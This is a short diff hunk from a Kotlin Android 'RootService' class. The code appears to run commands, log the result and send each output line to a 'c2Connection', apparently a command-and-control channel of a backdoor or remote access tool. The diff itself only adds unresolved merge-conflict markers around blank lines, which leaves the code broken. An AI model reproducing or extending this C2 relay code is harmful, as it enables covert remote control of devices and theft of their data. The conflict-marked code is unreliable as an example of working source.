@@ -111,7 +111,11 @@ class RootService : Service() {
                 Log.e(TAG, "Execution error", e)
                 "EXECUTION ERROR: ${e.message}"
             }
+<<<<<<< Updated upstream
             
+=======
+
+>>>>>>> Stashed changes
             Log.d(TAG, "Result: $result")
             result.split("\n").forEach { line ->
                 c2Connection?.sendData("OUT:$line")
